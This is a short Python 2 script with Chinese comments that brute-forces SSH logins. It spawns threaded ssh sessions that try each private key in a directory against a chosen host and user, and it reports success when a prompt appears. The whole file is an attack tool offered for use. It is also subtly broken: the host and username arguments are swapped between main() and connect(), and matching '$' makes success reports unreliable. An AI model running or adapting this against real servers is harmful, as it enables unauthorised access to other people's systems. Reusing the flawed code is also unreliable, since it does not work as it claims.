#!/usr/bin/python
#coding=utf-8
import pexpect
import optparse
import os
from threading import *

maxConnections = 5
#定义一个有界信号量BoundedSemaphore，在调用release()函数时会检查增加的计数是否超过上限
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0

def connect(host,user,keyfile,release):

	global Stop
	global Fails

	try:
		perm_denied = 'Permission denied'
		ssh_newkey = 'Are you sure you want to continue'
		conn_closed = 'Connection closed by remote host'
		opt = ' -o PasswordAuthentication=no'
		connStr = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt
		child = pexpect.spawn(connStr)
		ret = child.expect([pexpect.TIMEOUT,perm_denied,ssh_newkey,conn_closed,'$','#', ])
		#匹配到ssh_newkey
		if ret == 2:
			print '[-] Adding Host to ~/.ssh/known_hosts'
			child.sendline('yes')
			connect(user, host, keyfile, False)
		#匹配到conn_closed
		elif ret == 3:
			print '[-] Connection Closed By Remote Host'
			Fails += 1
		#匹配到提示符'$','#',
		elif ret > 3:
			print '[+] Success. ' + str(keyfile)
			Stop = True
	finally:
		if release:
			#释放锁
			connection_lock.release()

def main():
	parser = optparse.OptionParser('[*] Usage : ./sshBrute.py -H <target host> -u <username> -d <directory>')
	parser.add_option('-H',dest='host',type='string',help='specify target host')
	parser.add_option('-u',dest='username',type='string',help='target username')
	parser.add_option('-d',dest='passDir',type='string',help='specify directory with keys')
	(options,args) = parser.parse_args()

	if (options.host == None) | (options.username == None) | (options.passDir == None):
		print parser.usage
		exit(0)

	host = options.host
	username = options.username
	passDir = options.passDir

	#os.listdir()返回指定目录下的所有文件和目录名
	for filename in os.listdir(passDir):
		if Stop:
			print '[*] Exiting: Key Found.'
			exit(0)
		if Fails > 5:
			print '[!] Exiting: Too Many Connections Closed By Remote Host.'
			print '[!] Adjust number of simultaneous threads.'
			exit(0)
		#加锁
		connection_lock.acquire()

		#连接目录与文件名或目录
		fullpath = os.path.join(passDir,filename)
		print '[-] Testing keyfile ' + str(fullpath)
		t = Thread(target=connect,args=(username,host,fullpath,True))
		child = t.start()

if __name__ =='__main__':
	main()